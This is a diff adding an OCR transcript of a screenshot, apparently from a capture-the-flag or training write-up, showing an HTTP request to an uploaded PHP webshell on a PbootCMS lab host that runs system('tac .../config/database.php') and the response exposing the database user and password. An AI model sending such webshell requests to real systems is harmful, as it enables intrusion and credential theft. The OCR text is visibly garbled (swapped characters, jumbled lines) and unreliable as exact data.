@@ -1,0 +1,26 @@
+# OCR: 955abbf43a795db3e09197e7970e0c48.webp
+# 来源: ./02-WriteUp/2025/2025-能力验证-培训/955abbf43a795db3e09197e7970e0c48.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:36
+
+P0sT/static/upload/other/20220706/1657037870691680.phtmlHTTP/1.1 Host:192.168.9.177:19091
+User-Agent:Mozilla/5.0（x11;Linuxaarch64;rv:78.o)Gecko/201e01o1Firefox/78.0 Accept:text/html,application/xhtml+xml,application/xml;g=o.9,image/webp,*/*;g=o.8
+Accept-Language:en-us,en;q=o.5 Accept-Encoding:gzip,deflate
+Content-Type:application/x-www-form-urlencoded Content-Length:77
+0rigin:http://192.168.0.177:10001 Connection:keep-alive
+Referer:http://192.168.0.177:10001/static/upload/other/20220706/1657037870691680.phtml
+Cookie:1g=cn;PbootSystem=6vr3ep18mknlu87u2i9qpe5800;Hm1vtf6f37dc3416ca514857b78d0b158037e=1657036446;Hm1pvtf6f37dc3416ca514857b78dob158037e=165703 7782
+Upgrade-Insecure-Reguests:1
+h4ck4fun=system%28%22tac+%2Fvar%2Fwww%2Fhtm1%2Fconfig%2Fdatabase.php%22%29%3B HTTP/1.1200OK
+Server:nginx/1.1o.3(Ubuntu)
+Date:Tue,05Jul202216:25:17GMT
+Content-Type:text/html:charset=UTF-8 Transfer-Encoding:chunked
+Connection:keep-alive Content-Encoding: gzip
+月
+//‘dbname＇=>/data/pbootcms.db’//去掉注释，启用Sqlite数据库，注意修改type为sglite'dbname'=>‘pbootcms'//去掉注释，启用mysql数据库，注意修改前面的连接信息及type为mysqli port=>‘3306＇，//数据库端口
+'passwd’=>‘p4sswerd'，//数据库连接密码
+"user=>‘root'，//数据库连接用户名"host＇=>‘127.0.0.1，//数据库服务器
+'type’=>‘mysqli'，//数据库连接驱动类型：mysqli,sqlite,pdo_mysql,pdo_sqlite
+'database'=>array( return array(
+*如果修改为mysq1数据库，请同时修改type和dbname两个参数*主数据库连接参数，未配置的参数使用框架惯性配置
+/* <?php
